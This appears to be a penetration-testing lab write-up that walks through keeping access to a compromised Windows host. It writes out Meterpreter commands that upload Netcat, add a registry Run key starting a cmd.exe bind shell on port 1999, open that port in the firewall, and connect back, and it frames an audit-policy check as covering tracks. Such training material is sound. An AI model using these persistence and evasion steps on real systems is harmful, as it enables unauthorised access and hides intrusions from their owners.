# Retaining Access and Covering Tracks - Penetration Testing Lab


## Discription
This lab focuses on the critical aspect of penetration testing: retaining access and covering tracks after successfully infiltrating a system. The objective is to install a backdoor to maintain access, even if the initial vulnerability is patched or discovered by the target organization. This lab utilizes tools like Netcat (nc) and the Meterpreter shell in Kali Linux.

## Key Steps

1. Gaining Initial Access:

   - Reuse the exploit from a previous module to gain access to the target machine using Meterpreter.

2. Installing a Backdoor:

   - Upload and install nc.exe (Netcat) to the target Windows machine.
   - Modify the system registry to ensure Netcat starts on system boot, listening on port 1999.
   - Ensure the firewall settings allow traffic on the specified port.

3. Maintaining Access:

   - Test the backdoor to ensure it provides a command shell to the Kali machine.
   - Confirm successful backdoor installation by executing commands like ipconfig and providing screenshots.

4. Covering Tracks:

   - Check the target’s audit settings using auditpol.
   - Manipulate or review event logs to assess the stealthiness of the penetration.

## Commands and Screenshots
### Screenshots were taken throughout the process to document access, command execution, and configuration changes.


#### Meterpreter access on your target host

<img src="https://i.imgur.com/rWefLNQ.png"/>

#### Shell command to list the audit settings.
```ps
auditpol /get /category:*
```

<img src="https://i.imgur.com/iCIwRDe.png"/>

<img src="https://i.imgur.com/6DphOwU.png"/>

#### Command for metepreter shell that will upload the nc.exe program to the target host's windows\system32 directory
```ps
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```

<img src="https://i.imgur.com/mJyeTK4.png"/>

#### Command set nc to start as a listener on port 1999 by changing the target host's system registry
```ps
reg enumkey –k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc –d ‘C:\windows\system32\nc.exe –Ldp 1999 –e cmd.exe’
```
#### Command to verify Netcat is set to automatically run on startup
```ps
reg queryval –k HKLM\\software\\microsoft\\windows\\currentversion\\Run –v nc
```

<img src="https://i.imgur.com/AJSSWNn.png"/>


#### Command to display target host's firewall settings
```ps
netsh firewall show opmode
```

<img src="https://i.imgur.com/04eLDn6.png"/>

#### Command to set target firewall to open port 1999
```ps
netsh firewall add portopening TCP 1999 “Service Firewall” ENABLE ALL
```

#### Command to verify firewall configuration for open ports
```ps
netsh firewall show portopening
```

<img src="https://i.imgur.com/6Al7h1I.png"/>


#### Command to access target host through backdoor at prot 1999
```ps
nc –v 10.19.99.110 1999
```

<img src="https://i.imgur.com/C0uk1OC.png"/>
